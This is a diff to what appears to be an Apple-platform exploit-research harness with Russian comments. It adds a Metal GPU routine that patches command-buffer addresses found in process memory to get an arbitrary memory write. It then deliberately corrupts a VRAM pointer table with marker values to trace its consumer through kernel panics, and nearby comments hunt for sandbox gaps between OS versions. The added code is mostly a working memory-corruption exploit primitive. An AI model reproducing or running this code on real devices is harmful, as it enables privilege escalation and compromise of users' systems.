@@ -44894,6 +44894,131 @@ static void p_bq92(void) {
     fsync(fileno(stderr));
 }
 
+// bq93_write_custom: MT-PATCH write с ПРОИЗВОЛЬНЫМ контентом (0x1000) в target.
+static long bq93_write_custom(id<MTLCommandQueue> mq, id<MTLDevice> dev,
+                              uint64_t target, const uint8_t *content) {
+    id<MTLBuffer> bA = [dev newBufferWithLength:0x1000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bB = [dev newBufferWithLength:0x1000 options:MTLResourceStorageModeShared];
+    if (!bA || !bB) return -1;
+    uint64_t ga = [bA gpuAddress], gb = [bB gpuAddress];
+    (void)ga;
+    memcpy([bA contents], content, 0x1000);
+    memset([bB contents], 0, 0x1000);
+    id<MTLCommandBuffer> cb = [mq commandBuffer];
+    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+    [enc copyFromBuffer:bA sourceOffset:0 toBuffer:bB destinationOffset:0 size:0x1000];
+    [enc endEncoding];
+    void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+    if (!storage) return -2;
+    long pn = 0;
+    mach_vm_address_t addr = 0;
+    for (;;) {
+        mach_vm_size_t sz = 0;
+        vm_region_basic_info_data_64_t info;
+        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_port_t obj;
+        if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                           (vm_region_info_t)&info, &cnt, &obj)) break;
+        if ((info.protection & VM_PROT_WRITE) && sz >= 0x1000 && sz <= 0x4000000) {
+            uint8_t *base = (uint8_t *)addr;
+            for (mach_vm_size_t o = 0; o + 8 <= sz; o += 4)
+                if (*(uint64_t *)(base + o) == gb) { *(uint64_t *)(base + o) = target; pn++; }
+        }
+        addr += sz;
+        if (!sz) break;
+    }
+    @try { [cb commit]; } @catch (NSException *ex) {
+        LOG("[bq93] write EXCEPTION %s", [[ex reason] UTF8String]);
+        return -3;
+    }
+    for (int w = 0; w < 300 && (long)[cb status] < 4; w++) usleep(10000);
+    LOG("[bq93] write %#llx: слотов %ld status %ld", target, pn, (long)[cb status]);
+    return (long)[cb status];
+}
+
+// p_bq93 — v253: контролируемая порча VRAM-таблицы указателей (§244-next).
+// 1) Снапшот окрестности 0x100_00014000..0x100_00024000 (16 чанков по 0x1000),
+//    полный лог страницы-таблицы 0x100_0001c000 (512 u64) — артефакт.
+// 2) Per-slot маркеры: слот k = 0x4141410000000000|k — не-канонический адрес:
+//    паника на дерефе назовёт СЛОТ и путь. Оригинал утерян (§244-урок) —
+//    цель не восстановление, а идентификация консьюмера.
+// 3) R-verify + Метал-активность (3 коммита) + alive-статус.
+static void p_bq93(void) {
+    LOG("[bq93] v253: контролируемая порча ptr-таблицы (§244-next)");
+    fsync(fileno(stderr));
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) { LOG("[bq93] no MTLDevice"); return; }
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    if (!mq) { LOG("[bq93] no queue"); return; }
+    long k41 = 0, knz = 0;
+    if (bq92_probe(mq, dev, 2, 0, NULL, 0, &k41, &knz) < 0 || !knz) {
+        LOG("[bq93] K0 CONTROL FAILED"); return;
+    }
+    LOG("[bq93] K0 OK (Bnz %ld)", knz);
+    fsync(fileno(stderr));
+
+    uint8_t *snap = must_map(0x1000);
+    // === 1. Снапшот окрестности таблицы ===
+    for (int c = 0; c < 16; c++) {
+        uint64_t va = 0x10000014000ULL + (uint64_t)c * 0x1000;
+        long cnz = 0, c41 = 0;
+        memset(snap, 0, 0x1000);
+        bq92_probe(mq, dev, 0, va, snap, 0x1000, &c41, &cnz);
+        uint64_t mn = ~0ULL, mx = 0;
+        long np = 0;
+        for (int q = 0; q < 0x200; q++) {
+            uint64_t v = *(uint64_t *)(snap + q * 8);
+            if (v) { np++; if (v < mn) mn = v; if (v > mx) mx = v; }
+        }
+        LOG("[bq93] chunk %#llx: nonzero-u64 %ld/512, range [%#llx..%#llx]",
+            va, np, np ? mn : 0, np ? mx : 0);
+        if (va == 0x1000001c000ULL) {
+            LOG("[bq93] === ПОЛНЫЙ ЛОГ страницы-таблицы (512 слотов) ===");
+            for (int r = 0; r < 64; r++)
+                LOG("[bq93] tbl+%04x: %016llx %016llx %016llx %016llx %016llx %016llx %016llx %016llx",
+                    r * 0x40,
+                    *(uint64_t *)(snap + r*0x40 + 0), *(uint64_t *)(snap + r*0x40 + 8),
+                    *(uint64_t *)(snap + r*0x40 + 16), *(uint64_t *)(snap + r*0x40 + 24),
+                    *(uint64_t *)(snap + r*0x40 + 32), *(uint64_t *)(snap + r*0x40 + 40),
+                    *(uint64_t *)(snap + r*0x40 + 48), *(uint64_t *)(snap + r*0x40 + 56));
+        }
+        fsync(fileno(stderr));
+    }
+
+    // === 2. Per-slot маркеры ===
+    uint8_t *markers = must_map(0x1000);
+    for (int k = 0; k < 512; k++)
+        *(uint64_t *)(markers + k * 8) = 0x4141410000000000ULL | (uint64_t)k;
+    long ws = bq93_write_custom(mq, dev, 0x1000001c000ULL, markers);
+    LOG("[bq93] marker-write: status %ld (512 слотов: 0x4141410000000000|k)", ws);
+    fsync(fileno(stderr));
+    usleep(300000);
+
+    // === 3. R-verify ===
+    {
+        long cnz = 0, c41 = 0;
+        memset(snap, 0, 0x1000);
+        bq92_probe(mq, dev, 0, 0x1000001c000ULL, snap, 0x1000, &c41, &cnz);
+        long nm = 0;
+        for (int k = 0; k < 512; k++)
+            if (*(uint64_t *)(snap + k * 8) == (0x4141410000000000ULL | (uint64_t)k)) nm++;
+        LOG("[bq93] verify: маркеров на месте %ld/512 %s", nm,
+            nm == 512 ? "*** ВСЕ МАРКЕРЫ СТИКНУЛИСЬ ***" : "*** ЧАСТИЧНО/НЕТ ***");
+        fsync(fileno(stderr));
+    }
+
+    // === 4. Активность: plain-коммиты (возможный обход таблицы) ===
+    for (int i = 0; i < 3; i++) {
+        long a41 = 0, anz = 0;
+        bq92_probe(mq, dev, 2, 0, NULL, 0, &a41, &anz);
+        LOG("[bq93] activity %d: Bnz %ld (живы?)", i + 1, anz);
+        usleep(500000);
+        fsync(fileno(stderr));
+    }
+    LOG("[bq93] ИТОГ: маркеры в таблице; наблюдение продолжается вне фазы — паника назовёт слот");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -53500,6 +53625,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ90")) { p_bq90(); LOG("[probe13] bq90-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ91")) { p_bq91(); LOG("[probe13] bq91-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ92")) { p_bq92(); LOG("[probe13] bq92-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ93")) { p_bq93(); LOG("[probe13] bq93-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
